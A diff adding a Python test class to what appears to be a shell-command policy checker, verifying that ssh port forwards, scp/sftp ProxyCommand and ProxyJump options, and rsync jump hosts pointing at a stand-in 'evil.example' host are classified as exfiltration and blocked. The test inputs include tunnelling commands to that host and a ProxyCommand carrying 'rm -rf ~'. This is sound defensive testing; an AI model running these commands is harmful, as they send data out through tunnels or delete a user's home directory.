@@ -786,6 +786,101 @@ class ReviewV2Test(PolicyTestBase):
         self.assertNotIn("18", self.rows(bash("readonly FOO=1")))
 
 
+class ReviewV3Test(PolicyTestBase):
+    """Spellings the v3 review found: ssh port-forward endpoints (the
+    regression the v2 ssh option parser introduced by discarding `-L`/`-R`/`-W`
+    values) and the copy senders' inline-code and jump-host option channels.
+    Each test fails if its fix is reverted."""
+
+    # -- Issue 1 (merge blocker): ssh -L/-R/-W forward endpoints -------------
+
+    def test_ssh_local_forward_to_unknown_host_is_exfil(self):
+        # -L [bind:]port:host:hostport tunnels to `host` through the allowlisted
+        # ssh server; `host` must be classified, not discarded with the value.
+        for cmd in ("ssh api.example.com -L 8080:evil.example:80",
+                    "ssh -L localhost:8080:evil.example:80 api.example.com",
+                    "ssh -L8080:evil.example:80 api.example.com"):
+            with self.subTest(cmd=cmd):
+                r = self.rows(bash(cmd))
+                self.assertIn("20", r)
+                self.assertIn("8", r)   # the ssh destination is allowlisted
+                self.assertEqual(self.triple(bash(cmd)),
+                                 ("block", "block", "block"))
+
+    def test_ssh_remote_forward_to_unknown_host_is_exfil(self):
+        a = bash("ssh -R 2222:evil.example:22 api.example.com")
+        self.assertIn("20", self.rows(a))
+        self.assertEqual(self.triple(a), ("block", "block", "block"))
+
+    def test_ssh_stdio_forward_to_unknown_host_is_exfil(self):
+        for cmd in ("ssh api.example.com -W evil.example:22",
+                    "ssh -W evil.example:22 api.example.com"):
+            with self.subTest(cmd=cmd):
+                a = bash(cmd)
+                self.assertIn("20", self.rows(a))
+                self.assertEqual(self.triple(a), ("block", "block", "block"))
+
+    def test_ssh_dynamic_forward_names_no_host(self):
+        # -D is a dynamic SOCKS proxy with no fixed far-end host, so it adds no
+        # row 20 on its own; the ssh destination still classifies normally.
+        a = bash("ssh -D 1080 api.example.com")
+        r = self.rows(a)
+        self.assertIn("8", r)
+        self.assertNotIn("20", r)
+
+    def test_ssh_forward_to_allowlisted_host_is_not_exfil(self):
+        # A forward whose far end is itself allowlisted must not over-block.
+        a = bash("ssh api.example.com -L 8080:api.example.com:80")
+        r = self.rows(a)
+        self.assertIn("8", r)
+        self.assertNotIn("20", r)
+        self.assertEqual(self.verdict(a, "auto"), "allow")
+
+    # -- Issue 2: scp/sftp/rsync option channels -----------------------------
+
+    def test_scp_proxycommand_runs_local_code(self):
+        for cmd in ("scp -o ProxyCommand='rm -rf ~' a.txt api.example.com:/x",
+                    "scp -oProxyCommand='rm -rf ~' a.txt api.example.com:/x"):
+            with self.subTest(cmd=cmd):
+                r = self.rows(bash(cmd))
+                self.assertIn("25", r)
+                self.assertIn("28", r)
+                self.assertEqual(self.triple(bash(cmd)),
+                                 ("block", "block", "block"))
+
+    def test_sftp_proxycommand_runs_local_code(self):
+        a = bash("sftp -o ProxyCommand='rm -rf ~' api.example.com")
+        r = self.rows(a)
+        self.assertIn("25", r)
+        self.assertIn("28", r)
+        self.assertEqual(self.triple(a), ("block", "block", "block"))
+
+    def test_scp_proxyjump_to_unknown_host_is_exfil(self):
+        for cmd in ("scp -o ProxyJump=evil.example a.txt api.example.com:/x",
+                    "scp -J evil.example a.txt api.example.com:/x"):
+            with self.subTest(cmd=cmd):
+                r = self.rows(bash(cmd))
+                self.assertIn("20", r)
+                self.assertEqual(self.triple(bash(cmd)),
+                                 ("block", "block", "block"))
+
+    def test_rsync_remote_shell_carries_jump_host(self):
+        a = bash("rsync -e 'ssh -J evil.example' a api.example.com:/x")
+        r = self.rows(a)
+        self.assertIn("25", r)
+        self.assertIn("20", r)
+        self.assertEqual(self.triple(a), ("block", "block", "block"))
+
+    def test_copy_senders_without_options_unchanged(self):
+        # The option parser must leave the plain local-copy / remote-copy
+        # verdicts exactly as before.
+        self.assertIn("6", self.rows(bash("scp a.txt b.txt")))
+        self.assertNotIn("20", self.rows(bash("scp a.txt b.txt")))
+        self.assertIn("20", self.rows(bash("scp a.txt user@evil.example:/x")))
+        self.assertIn("6", self.rows(bash("rsync -az src/ dst/")))
+        self.assertNotIn("20", self.rows(bash("rsync -az src/ dst/")))
+
+
 class MetadataEncodingTest(unittest.TestCase):
     """netcheck loopback / metadata spellings (review v2 issue 8)."""
 
